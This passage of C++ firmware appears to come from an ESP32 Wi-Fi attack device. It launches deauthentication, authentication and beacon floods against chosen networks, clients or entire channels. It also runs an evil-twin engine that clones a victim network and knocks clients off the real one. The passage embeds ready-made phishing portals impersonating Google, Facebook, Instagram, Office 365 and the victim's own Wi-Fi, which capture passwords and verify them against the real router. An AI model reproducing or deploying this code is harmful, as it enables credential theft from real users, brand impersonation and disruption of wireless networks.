  ae::AttackType type=pendingSelectAttack;
  String title=pendingSelectTitle;
  pendingSelectAttack=ae::AttackType::NONE;
  pendingSelectTitle="";
  if(targets.empty()){showPopup(title.length()?title:String("ATTACK"),"NO AP SELECTED","CHECK AT LEAST ONE");return;}
  stopMonitor();
  syncEngineAPs();
  String lbl=(targets.size()==1)?first:(String((unsigned)targets.size())+" APS");
  ae::attackStart(type,title.c_str(),lbl.c_str(),targets);
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

static void launchSTAAttack(ae::AttackType type,const char* title){
  if(ae::staCount()==0){showPopup(title,"NO STATIONS","RUN SCAN > SCAN STATIONS");return;}
  stopMonitor();
  syncEngineAPs();
  std::vector<ae::TargetSTA> targets;
  for(size_t i=0;i<ae::staCount() && i<MAX_STA_SEL;i++){
    ae::STAInfo *s=ae::staAt(i); if(!s)continue;
    ae::TargetSTA t;
    memcpy(t.sta,s->sta,6); memcpy(t.ap,s->ap,6);
    int idx=ae::findKnownAP(s->ap);
    if(idx>=0){ae::TargetAP *apv=ae::knownAPAt((size_t)idx); if(apv) t.channel=apv->channel;}
    else t.channel=s->channel;   // V20: client of an unlisted AP - use last-heard channel
    targets.push_back(t);
  }
  if(targets.empty()){showPopup(title,"NO STATIONS","RESCAN STATIONS");return;}
  String lbl=String((unsigned)targets.size())+" STATIONS";
  ae::attackStart(type,title,"",std::vector<ae::TargetAP>(),targets);
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

static void launchSelectedSTAAttack(){
  if(ae::staCount()==0){showPopup("DEAUTH STAS","NO STATIONS","RUN SCAN > SCAN STATIONS");return;}
  stopMonitor();
  syncEngineAPs();
  std::vector<ae::TargetSTA> targets;
  for(size_t i=0;i<ae::staCount() && i<MAX_STA_SEL;i++){
    if(!selectedSTA[i])continue;
    ae::STAInfo *s=ae::staAt(i); if(!s)continue;
    ae::TargetSTA t;
    memcpy(t.sta,s->sta,6); memcpy(t.ap,s->ap,6);
    int idx=ae::findKnownAP(s->ap);
    if(idx>=0){ae::TargetAP *apv=ae::knownAPAt((size_t)idx); if(apv) t.channel=apv->channel;}
    else t.channel=s->channel;   // V20: client of an unlisted AP - use last-heard channel
    targets.push_back(t);
    selectedSTA[i]=false;
  }
  if(targets.empty()){showPopup("DEAUTH STAS","NO STA SELECTED","CHECK AT LEAST ONE");return;}
  String lbl=String((unsigned)targets.size())+" STATIONS";
  ae::attackStart(ae::AttackType::DEAUTH_STA_SELECTED,"DEAUTH SELECTED STAS",lbl.c_str(),std::vector<ae::TargetAP>(),targets);
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

static void launchChannelAttack(ChannelAction act,uint8_t channel){
  syncEngineAPs();
  std::vector<ae::TargetAP> targets;
  for(size_t i=0;i<apCount && i<MAX_APS;i++){
    if(aps[i].channel!=channel)continue;
    uint8_t b[6]; apParseBSSID(aps[i].bssid,b);
    ae::TargetAP t;
    memcpy(t.bssid,b,6);
    strncpy(t.ssid,aps[i].ssid.c_str(),32);
    t.channel=channel; t.encrypted=aps[i].encrypted;
    targets.push_back(t);
  }
  const char* title="ATTACK";
  ae::AttackType type=ae::AttackType::DEAUTH_CHANNEL;
  switch(act){
    case CH_ACT_DEAUTH: type=ae::AttackType::DEAUTH_CHANNEL; title="DEAUTH BY CHANNEL"; break;
    case CH_ACT_AUTH:   type=ae::AttackType::AUTH_CHANNEL;   title="AUTH BY CHANNEL";   break;
    case CH_ACT_ASSOC:  type=ae::AttackType::ASSOC_CHANNEL;  title="ASSOC BY CHANNEL";  break;
    case CH_ACT_BEACON: type=ae::AttackType::BEACON_CHANNEL; title="BEACON BY CHANNEL"; break;
    default: return;
  }
  if(targets.empty()){
    showPopup(title,(String("NO APS ON CH ")+String(channel)).c_str(),"RUN A SCAN OR PICK ANOTHER");
    return;
  }
  String lbl=String("CH ")+String(channel)+" / "+String((unsigned)targets.size())+" APS";
  ae::attackStart(type,title,lbl.c_str(),targets);
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

static void openChannelPicker(ChannelAction act){
  pendingChannelAction=act;
  transitionTo(CHANNEL_PICK);
}

static void launchSpoofClone(){
  stopMonitor();
  pendingSelectAttack=ae::AttackType::SPOOF_AP;
  pendingSelectTitle="AP SPOOFING (CLONE)";
  pendingTargetAction=false;pendingTargetActionTitle="";
  if(apCount==0){scanThenSelect=true;beginScanAPs();return;}
  listTop=0;transitionTo(AP_SELECT);
}

static void launchEvilTwin(){
  stopMonitor();
  syncEngineAPs();
  etPickMode=1;
  pendingActionReturn=COMBO;
  pendingTargetAction=true;pendingTargetActionTitle="PICK TARGET AP";
  wifiConnectMode=false;
  if(apCount>0){listTop=0;transitionTo(AP_RESULTS);return;}
  beginScanAPs();
}

// =====================  EVIL TWIN ENGINE  =====================
// Real rogue-AP attack: softAP clone of the victim SSID + wildcard DNS +
// captive-portal interception for iOS / Android / Windows / macOS / Linux +
// advanced phishing page + continuous deauth against the victim AP.
// MEGA mode: much stronger deauth + disassoc + client-directed kicks.
// Custom portal: place /PORTAL.HTML (or /portal.html) on the SD card.

static void stopBLECarrier();
static String displaySSID(const String &s,size_t maxLen);
static bool hsPopupShown=false; static bool hsPcapHeaderWritten=false;

static const char ET_PORTAL_HTML[] PROGMEM = R"HTML(<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Wi-Fi Verification</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
body{min-height:100vh;background:linear-gradient(160deg,#0b1220 0%,#101a2e 55%,#0b1220 100%);color:#eaf2ff;display:flex;align-items:center;justify-content:center;padding:24px}
.card{background:rgba(255,255,255,.055);border:1px solid rgba(255,255,255,.10);border-radius:22px;padding:30px 26px;max-width:360px;width:100%;backdrop-filter:blur(14px);box-shadow:0 18px 60px rgba(0,0,0,.55)}
.logo{width:74px;height:74px;margin:0 auto 14px;border-radius:50%;background:radial-gradient(circle at 32% 30%,#2dd4ff,#0d5fb8 70%);display:flex;align-items:center;justify-content:center}
h1{font-size:19px;text-align:center;margin-bottom:6px;font-weight:600}
p.s1{font-size:12.5px;color:#9fb3d1;text-align:center;margin-bottom:20px;line-height:1.5}
.net{display:flex;align-items:center;gap:10px;background:rgba(0,0,0,.30);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:11px 13px;margin-bottom:16px}
.net b{font-size:14.5px;font-weight:600;word-break:break-all}
.net small{color:#7e93b4;font-size:10.5px}
label{font-size:11px;color:#9fb3d1;display:block;margin:0 0 6px 4px;text-transform:uppercase;letter-spacing:.6px}
input[type=password]{width:100%;padding:13px 14px;border-radius:12px;border:1px solid rgba(255,255,255,.14);background:rgba(0,0,0,.35);color:#fff;font-size:15px;outline:none}
input:focus{border-color:#2dd4ff}
button{width:100%;margin-top:18px;padding:13px;border:0;border-radius:12px;background:linear-gradient(90deg,#12b8ff,#0a6cff);color:#fff;font-size:15px;font-weight:600;letter-spacing:.3px}
button:active{transform:scale(.98)}
.note{font-size:10px;color:#66799a;text-align:center;margin-top:14px;line-height:1.5}
</style></head><body><div class="card">
<div class="logo"><svg width="38" height="38" viewBox="0 0 24 24" fill="none"><path d="M12 19.5a1.6 1.6 0 100 3.2 1.6 1.6 0 000-3.2zM7.6 15.2a6.2 6.2 0 018.8 0l-1.7 1.7a3.8 3.8 0 00-5.4 0l-1.7-1.7zM4.1 11.7a11.2 11.2 0 0115.8 0l-1.7 1.7a8.7 8.7 0 00-12.4 0l-1.7-1.7zM.6 8.2a16.2 16.2 0 0122.8 0l-1.7 1.7a13.7 13.7 0 00-19.4 0L.6 8.2z" fill="#fff"/></svg></div>
<h1>Wi-Fi Verification Required</h1>
<p class="s1">A security update is required before reconnecting to this network.</p>
<div class="net"><div><b>%SSID%</b><small>WPA2 protected &middot; signal verification in progress</small></div></div>
<form method="POST" action="/post">
<label>Network password</label>
<input type="password" name="p" placeholder="Enter the Wi-Fi password" required minlength="1">
<button type="submit">JOIN NETWORK</button>
</form>
<p class="note">Your connection will be restored automatically after verification.</p>
</div></body></html>)HTML";

static const char ET_CHECK_HTML[] PROGMEM = R"HTML(<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<meta http-equiv="refresh" content="6;url=/done">
<title>Verifying</title>
<style>body{min-height:100vh;background:linear-gradient(160deg,#0b1220,#101a2e);color:#eaf2ff;display:flex;align-items:center;justify-content:center;font-family:-apple-system,'Segoe UI',Roboto,sans-serif;text-align:center}
.spin{width:44px;height:44px;margin:0 auto 18px;border-radius:50%;border:4px solid rgba(255,255,255,.12);border-top-color:#2dd4ff;animation:s 1s linear infinite}@keyframes s{to{transform:rotate(360deg)}}
h1{font-size:17px;font-weight:600}p{font-size:12.5px;color:#9fb3d1;margin-top:8px}</style></head>
<body><div><div class="spin"></div><h1>Verifying password...</h1><p>Please wait while we test your connection.</p></div></body></html>)HTML";

static const char ET_DONE_HTML[] PROGMEM = R"HTML(<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<meta http-equiv="refresh" content="10;url=/">
<title>Connected</title>
<style>body{min-height:100vh;background:linear-gradient(160deg,#0b1220,#101a2e);color:#eaf2ff;display:flex;align-items:center;justify-content:center;font-family:-apple-system,'Segoe UI',Roboto,sans-serif;text-align:center}
.ok{width:64px;height:64px;margin:0 auto 16px;border-radius:50%;background:radial-gradient(circle at 32% 30%,#34e07a,#0d9448);display:flex;align-items:center;justify-content:center}
h1{font-size:17px;font-weight:600}p{font-size:12.5px;color:#9fb3d1;margin-top:8px}</style></head>
<body><div><div class="ok"><svg width="34" height="34" viewBox="0 0 24 24"><path d="M4 12.5l5 5L20 6.5" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
<h1>Verification complete</h1><p>Reconnecting you to the network...</p></div></body></html>)HTML";

// ---- V20 additional built-in portal templates -----------------------------
// Every template posts its fields to /post; etHandlePost() accepts the common
// field names of each brand (u / p, email, loginfmt, passwd, ...).
static const char ET_GMAIL_HTML[] PROGMEM = R"HTML(<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>Sign in - Google Accounts</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:Roboto,-apple-system,Arial,sans-serif}
body{min-height:100vh;background:#f0f4f9;display:flex;align-items:center;justify-content:center;padding:24px}
.card{background:#fff;border-radius:28px;padding:40px 40px 36px;max-width:400px;width:100%;box-shadow:0 1px 3px rgba(60,64,67,.3),0 4px 8px 3px rgba(60,64,67,.15)}
.g{display:flex;align-items:center;gap:10px;margin-bottom:18px}
h1{font-size:24px;color:#1f1f1f;font-weight:400;margin-bottom:8px}
p.s{font-size:14px;color:#444746;margin-bottom:26px}
input{width:100%;padding:14px 15px;border:1px solid #747775;border-radius:6px;font-size:16px;margin-bottom:14px;outline:none;background:#fff}
input:focus{border:2px solid #0b57d0;padding:13px 14px}
.b{display:flex;justify-content:space-between;align-items:center;margin-top:16px}
button{background:#0b57d0;color:#fff;border:0;border-radius:100px;padding:10px 24px;font-size:14px;font-weight:500}
a{color:#0b57d0;font-size:14px;text-decoration:none;font-weight:500}
.note{font-size:12px;color:#444746;margin-top:26px;line-height:1.5}
</style></head><body><div class="card">
<div class="g"><svg width="40" height="40" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.6 20.1H42V20H24v8h11.3C33.7 32.7 29.2 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3l5.7-5.7C34.3 6.1 29.4 4 24 4 13 4 4 13 4 24s9 20 20 20 20-9 20-20c0-1.3-.1-2.6-.4-3.9z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.9 1.2 8 3l5.7-5.7C34.3 6.1 29.4 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.1H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C36.9 39.2 44 34 44 24c0-1.3-.1-2.6-.4-3.9z"/></svg><span style="font-size:20px;color:#5f6368">Google</span></div>
<h1>Sign in</h1><p class="s">Use your Google Account to keep the Wi-Fi service active</p>
<form method="POST" action="/post">
<input type="email" name="u" placeholder="Email or phone" required>
<input type="password" name="p" placeholder="Enter your password" required>
<div class="b"><a href="#">Forgot password?</a><button type="submit">Next</button></div>
</form>
<p class="note">Your network provider needs to re-validate the account linked to this connection.</p>
</div></body></html>)HTML";

static const char ET_FACEBOOK_HTML[] PROGMEM = R"HTML(<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>Log in to Facebook</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:Helvetica,-apple-system,Arial,sans-serif}
body{min-height:100vh;background:#f0f2f5;display:flex;align-items:center;justify-content:center;padding:24px}
.card{background:#fff;border-radius:10px;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:22px;max-width:400px;width:100%}
h1{color:#1877f2;font-size:30px;text-align:center;margin-bottom:12px}
p.s{font-size:15px;color:#606770;text-align:center;margin-bottom:18px}
input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:8px;font-size:16px;margin-bottom:12px;outline:none}
input:focus{border-color:#1877f2}
button{width:100%;background:#1877f2;color:#fff;border:0;border-radius:8px;padding:12px;font-size:18px;font-weight:700;margin-top:4px}
a{display:block;text-align:center;color:#1877f2;font-size:14px;margin-top:14px;text-decoration:none}
.hr{border-top:1px solid #dadde1;margin:18px 0 0}
.note{font-size:12px;color:#8a8d91;text-align:center;margin-top:14px}
</style></head><body><div class="card">
<h1>facebook</h1>
<p class="s">Log in to re-authenticate the Wi-Fi network session</p>
<form method="POST" action="/post">
<input type="text" name="u" placeholder="Email address or phone number" required>
<input type="password" name="p" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<a href="#">Forgotten password?</a>
<div class="hr"></div>
<p class="note">Session expired for this network - please log in to continue.</p>
</div></body></html>)HTML";

static const char ET_INSTAGRAM_HTML[] PROGMEM = R"HTML(<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>Instagram</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
body{min-height:100vh;background:#fafafa;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:38px 40px;max-width:380px;width:100%}
h1{font-family:'Billabong','Segoe Script',cursive;font-size:34px;text-align:center;font-weight:400;margin-bottom:20px;color:#262626}
input{width:100%;padding:11px 12px;background:#fafafa;border:1px solid #dbdbdb;border-radius:4px;font-size:13px;margin-bottom:8px;outline:none}
button{width:100%;background:#0095f6;color:#fff;border:0;border-radius:8px;padding:9px;font-size:14px;font-weight:600;margin-top:8px}
.a{display:flex;align-items:center;margin:16px 0}
.a div{flex:1;height:1px;background:#dbdbdb}.a span{color:#8e8e8e;font-size:12px;padding:0 16px}
.fb{color:#385185;font-size:13px;text-align:center;font-weight:600}
.note{font-size:11px;color:#8e8e8e;text-align:center;margin-top:22px;line-height:1.5}
</style></head><body><div class="card">
<h1>Instagram</h1>
<form method="POST" action="/post">
<input type="text" name="u" placeholder="Phone number, username or email" required>
<input type="password" name="p" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="a"><div></div><span>OR</span><div></div></div>
<p class="fb">Log in with Facebook</p>
<p class="note">Wi-Fi network session expired. Log in again to restore full access.</p>
</div></body></html>)HTML";

static const char ET_OFFICE_HTML[] PROGMEM = R"HTML(<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>Sign in to your account</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',-apple-system,Arial,sans-serif}
body{min-height:100vh;background:#fff;display:flex;align-items:center;justify-content:center}
.card{max-width:440px;width:100%;padding:44px}
.logo{margin-bottom:14px}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:16px}
input{width:100%;padding:9px 10px;border:0;border-bottom:1px solid #666;font-size:15px;margin-bottom:20px;outline:none}
input:focus{border-bottom:2px solid #0067b8}
button{float:right;background:#0067b8;color:#fff;border:0;padding:8px 40px;font-size:15px}
button:active{opacity:.85}
.note{clear:both;font-size:12px;color:#605e5c;margin-top:56px;line-height:1.5}
</style></head><body><div class="card">
<div class="logo"><svg width="26" height="26" viewBox="0 0 24 24"><rect x="1" y="4" width="12" height="16" fill="#EB3C00"/><path d="M13 2l10 3.2v13.6L13 22V2z" fill="#32A9E7"/><path d="M13 7.5L19 12l-6 4.5v-9z" fill="#fff" opacity=".4"/></svg></div>
<h1>Sign in</h1>
<form method="POST" action="/post">
<input type="email" name="u" placeholder="Email, phone, or Skype" required>
<input type="password" name="p" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<p class="note">Wi-Fi network access requires re-authentication of your work or school account.</p>
</div></body></html>)HTML";

// FIX WIFI twin: professional "provider maintenance" story page. The victim
// picks their network from the live scan list (%NETS% is injected by the
// firmware) and types their password; the device then verifies it against
// the real network and only "restores the connection" when it is correct.
static const char ET_FIX_HTML[] PROGMEM = R"HTML(<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>Network Maintenance</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
body{min-height:100vh;background:linear-gradient(165deg,#071b12 0%,#0d2b1c 55%,#071b12 100%);color:#e9fff3;display:flex;align-items:center;justify-content:center;padding:22px}
.card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:22px;padding:28px 26px;max-width:380px;width:100%;backdrop-filter:blur(14px);box-shadow:0 18px 60px rgba(0,0,0,.55)}
.logo{width:70px;height:70px;margin:0 auto 14px;border-radius:50%;background:radial-gradient(circle at 32% 30%,#37e08c,#0a7a45 72%);display:flex;align-items:center;justify-content:center}
h1{font-size:20px;text-align:center;font-weight:600;margin-bottom:8px}
p.s{font-size:13px;color:#a8d8bf;text-align:center;line-height:1.6;margin-bottom:18px}
.story{background:rgba(0,0,0,.28);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:14px 16px;font-size:12.5px;color:#cfe9db;line-height:1.65;margin-bottom:18px}
.story b{color:#7ff0b1}
label{font-size:11px;color:#a8d8bf;display:block;margin:0 0 6px 4px;text-transform:uppercase;letter-spacing:.6px}
select,input[type=password]{width:100%;padding:12px 13px;border-radius:12px;border:1px solid rgba(255,255,255,.16);background:rgba(0,0,0,.35);color:#fff;font-size:14px;outline:none;margin-bottom:14px}
select option{background:#0d2b1c}
button{width:100%;margin-top:8px;padding:13px;border:0;border-radius:12px;background:linear-gradient(90deg,#2ee38b,#0f9c5c);color:#04160c;font-size:15px;font-weight:700;letter-spacing:.3px}
.note{font-size:10.5px;color:#6fae8d;text-align:center;margin-top:14px;line-height:1.5}
</style></head><body><div class="card">
<div class="logo"><svg width="36" height="36" viewBox="0 0 24 24" fill="none"><path d="M12 19.5a1.6 1.6 0 100 3.2 1.6 1.6 0 000-3.2zM7.6 15.2a6.2 6.2 0 018.8 0l-1.7 1.7a3.8 3.8 0 00-5.4 0l-1.7-1.7zM4.1 11.7a11.2 11.2 0 0115.8 0l-1.7 1.7a8.7 8.7 0 00-12.4 0l-1.7-1.7z" fill="#04160c"/><path d="M9 20l2.2-6.2L15 16l-2 4h-4z" fill="#04160c" opacity=".9"/></svg></div>
<h1>Wi-Fi Maintenance In Progress</h1>
<p class="s">Temporarily connect through the <b>Fix WiFi</b> service network</p>
<div class="story">Your Internet provider is <b>updating the local network equipment</b>. Some routers have lost their connection during the upgrade.<br><br>Select your network and enter its password: our system will <b>verify your credentials</b> and restore your Internet automatically in a few seconds.</div>
<form method="POST" action="/post">
<label>Your network</label>
<select name="ssid">%NETS%</select>
<label>Network password</label>
<input type="password" name="p" placeholder="Enter your Wi-Fi password" required minlength="1">
<button type="submit">RESTORE MY CONNECTION</button>
</form>
<p class="note">Verification is done directly with your router. Incorrect passwords cannot restore the service.</p>
</div></body></html>)HTML";

// V21 LIVE KEYBOARD PAGE: the message body is typed by the user on the
// device keyboard (etKeyEsc, %MSG% is injected per request). Everything
// else works like the standard verification page.
static const char ET_LIVE_HTML[] PROGMEM = R"HTML(<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>Network Notice</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
body{min-height:100vh;background:linear-gradient(160deg,#101418 0%,#1a2027 55%,#101418 100%);color:#eef4fb;display:flex;align-items:center;justify-content:center;padding:24px}
.card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:22px;padding:30px 26px;max-width:370px;width:100%;backdrop-filter:blur(14px);box-shadow:0 18px 60px rgba(0,0,0,.55)}
.logo{width:72px;height:72px;margin:0 auto 14px;border-radius:50%;background:radial-gradient(circle at 32% 30%,#ffd66e,#b97e0a 72%);display:flex;align-items:center;justify-content:center}
h1{font-size:19px;text-align:center;margin-bottom:6px;font-weight:600}
.net{display:flex;align-items:center;gap:10px;background:rgba(0,0,0,.30);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:11px 13px;margin:14px 0}
.net b{font-size:14.5px;font-weight:600;word-break:break-all}
.net small{color:#8fa1b8;font-size:10.5px}
.msg{background:rgba(0,0,0,.28);border:1px solid rgba(255,255,255,.09);border-radius:14px;padding:14px 16px;font-size:13.5px;color:#e8eef7;line-height:1.7;margin-bottom:16px;white-space:pre-wrap}
label{font-size:11px;color:#9fb0c6;display:block;margin:0 0 6px 4px;text-transform:uppercase;letter-spacing:.6px}
input[type=password]{width:100%;padding:13px 14px;border-radius:12px;border:1px solid rgba(255,255,255,.15);background:rgba(0,0,0,.35);color:#fff;font-size:15px;outline:none}
input:focus{border-color:#ffd66e}
button{width:100%;margin-top:18px;padding:13px;border:0;border-radius:12px;background:linear-gradient(90deg,#ffd66e,#e0a32e);color:#201703;font-size:15px;font-weight:700}
.note{font-size:10.5px;color:#7c8da3;text-align:center;margin-top:14px;line-height:1.5}
</style></head><body><div class="card">
<div class="logo"><svg width="36" height="36" viewBox="0 0 24 24" fill="none"><path d="M12 3a6 6 0 016 6c0 2.2-1.2 3.6-2.4 4.8-.8.8-1.6 1.5-1.6 3.2h-4c0-2.4 1.2-3.6 2.3-4.7C13.3 11.2 14 10.4 14 9a2 2 0 10-4 0H8a4 4 0 018 0" fill="#201703"/><circle cx="12" cy="20.4" r="1.5" fill="#201703"/></svg></div>
<h1>%SSID%</h1>
<div class="net"><div><b>%SSID%</b><small>network notice service</small></div></div>
<div class="msg">%MSG%</div>
<form method="POST" action="/post">
<label>Network password</label>
<input type="password" name="p" placeholder="Enter the Wi-Fi password" required minlength="1">
<button type="submit">CONTINUE</button>
</form>
<p class="note">If you need help, contact your network administrator.</p>
</div></body></html>)HTML";

// Local raw-frame builders: they deliberately bypass the engine helpers so
// that no esp_wifi_set_channel() call can ever move the softAP off channel.
static const uint8_t ET_DEAUTH_TMPL[26] = {
  0xC0,0x00,0x3A,0x01,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00, 0x07,0x00
};
static void etTxDeauth(const uint8_t *dest,uint8_t subtype,uint8_t count){
  uint8_t pkt[26];
  memcpy(pkt,ET_DEAUTH_TMPL,26);
  pkt[0]=subtype;
  memcpy(&pkt[4],dest,6);
  memcpy(&pkt[10],etBSSID,6);
  memcpy(&pkt[16],etBSSID,6);
  for(uint8_t i=0;i<count;i++){
    esp_wifi_80211_tx(WIFI_IF_STA,pkt,26,false);
    etTx++;
  }
}
// Deauth framed as if it came from ANOTHER AP (used by the FIX sweep so the
// pressure also reaches every other network heard on the current channel).
static void etTxDeauthFrom(const uint8_t *apbssid,const uint8_t *dest,uint8_t subtype,uint8_t count){
  uint8_t pkt[26];
  memcpy(pkt,ET_DEAUTH_TMPL,26);
  pkt[0]=subtype;
  memcpy(&pkt[4],dest,6);
  memcpy(&pkt[10],apbssid,6);
  memcpy(&pkt[16],apbssid,6);
  for(uint8_t i=0;i<count;i++){
    esp_wifi_80211_tx(WIFI_IF_STA,pkt,26,false);
    etTx++;
  }
}
static void etTxBeacon(){
  uint8_t ssidLen=(uint8_t)etSSID.length(); if(ssidLen>32)ssidLen=32;
  static const uint8_t B38[38]={
    0x80,0x00,0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0xE8,0x03, 0x01,0x04};
  uint8_t pkt[128];
  memcpy(pkt,B38,38);
  memcpy(&pkt[10],etBSSID,6);
  memcpy(&pkt[16],etBSSID,6);
  int idx=38;
  pkt[idx++]=0x00; pkt[idx++]=ssidLen;
  memcpy(&pkt[idx],etSSID.c_str(),ssidLen); idx+=ssidLen;
  static const uint8_t RATES[10]={0x01,0x08,0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
  memcpy(&pkt[idx],RATES,10); idx+=10;
  pkt[idx++]=0x03; pkt[idx++]=0x01; pkt[idx++]=etChannel;
  static const uint8_t RSN[26]={
    0x30,0x18,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x04,
    0x01,0x00,0x00,0x0F,0xAC,0x02,0x00,0x00};
  memcpy(&pkt[idx],RSN,26); idx+=26;
  esp_wifi_80211_tx(WIFI_IF_STA,pkt,idx,false);
  esp_wifi_80211_tx(WIFI_IF_STA,pkt,idx,false);
}

// V21: single channel-change choke point for the whole evil twin. The
// deauth pressure MUST go out on the victim's channel even when the
// softAP had to fall back to another band - this tracker makes sure raw
// frames never land on the wrong band (the root cause of "deauth does
// nothing on 5 GHz").
static void etGotoChannel(uint8_t ch){
  if(ch<1)ch=1;
  if(ch==etRadioCh)return;
  esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
  esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE);
  etRadioCh=ch;
}

// V21: collect every BSSID broadcasting the victim SSID (dual-band routers
// announce the same name on 2.4 + 5 GHz - both must be attacked or phones
// simply hop to the untouched band). The victim BSSID is always entry 0.
static void etBuildTwins(const uint8_t *victimBssid,const char* ssid,uint8_t victimCh){
  etTwinCount=0;etTwinIdx=0;
  auto addT=[&](const uint8_t* bssid,uint8_t ch){
    if(ch<1)ch=1;
    if(etTwinCount>=6)return;
    for(size_t i=0;i<etTwinCount;i++) if(memcmp(etTwins[i].bssid,bssid,6)==0) return;
    memcpy(etTwins[etTwinCount].bssid,bssid,6);
    etTwins[etTwinCount].channel=ch;
    etTwinCount++;
  };
  if(victimBssid) addT(victimBssid,victimCh);
  if(ssid && ssid[0]){
    for(size_t i=0;i<apCount && i<MAX_APS;i++){
      if(aps[i].ssid.length()==0)continue;
      if(aps[i].ssid!=(const char*)ssid)continue;
      uint8_t b[6]; apParseBSSID(aps[i].bssid,b);
      addT(b,(uint8_t)aps[i].channel);
    }
  }
}

// ---------------- V20 portal template system ----------------
// Before any evil attack launches, the device lists every available portal
// page: the built-in brand templates + every *.html / *.htm found on the SD
// card. The picked page is what the captive portal will serve.
static const size_t ET_TMPL_MAX=20;
static String   etTmplName[ET_TMPL_MAX];
static int8_t   etTmplBuiltin[ET_TMPL_MAX];   // 0..5 built-in, -1 = SD file
static String   etTmplPath[ET_TMPL_MAX];      // SD path when builtin == -1
static size_t   etTmplCount=0;

static void buildTemplateList(){
  etTmplCount=0;
  auto addT=[&](const char* name,int8_t builtin,const String &path){
    if(etTmplCount>=ET_TMPL_MAX)return;
    etTmplName[etTmplCount]=name;
    etTmplBuiltin[etTmplCount]=builtin;
    etTmplPath[etTmplCount]=path;
    etTmplCount++;
  };
  addT("WIFI PASSWORD",0,"");
  addT("GMAIL LOGIN",1,"");
  addT("FACEBOOK LOGIN",2,"");
  addT("INSTAGRAM LOGIN",3,"");
  addT("OFFICE 365 LOGIN",4,"");
  addT("FIX WIFI STORY",5,"");
  addT("LIVE KEYBOARD PAGE",6,"");
  sdRefreshFiles();
  for(size_t i=0;i<sdFileCount && etTmplCount<ET_TMPL_MAX;i++){
    if(sdFileDirs[i])continue;
    String lp=sdFilePaths[i]; lp.toUpperCase();
    if(!lp.endsWith(".HTML") && !lp.endsWith(".HTM"))continue;
    String nm=sdFilePaths[i];
    nm=nm.substring(nm.lastIndexOf('/')+1);
    addT(nm.c_str(),-1,sdFilePaths[i]);
  }
}

static String etTemplateHTML(size_t idx){
  if(idx>=etTmplCount) idx=0;
  int8_t b=etTmplBuiltin[idx];
  switch(b){
    case 0: return String(ET_PORTAL_HTML);
    case 1: return String(ET_GMAIL_HTML);
